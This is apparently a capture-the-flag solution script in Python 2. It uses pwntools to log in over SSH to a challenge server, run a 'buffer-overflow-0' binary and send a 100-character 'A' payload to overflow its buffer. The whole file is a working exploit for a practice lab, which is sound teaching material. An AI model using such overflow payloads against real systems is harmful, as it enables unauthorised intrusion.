#!/usr/python2.7

import requests
import pwn

host = "18.188.70.152"
user = 'Noball'

sh = pwn.ssh(user, host)

cmd = "cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d;"
cmd += "./vuln "

payload = 'A' * 100

rec = sh.run(cmd)

rec.sendline(payload)

print rec.recvall()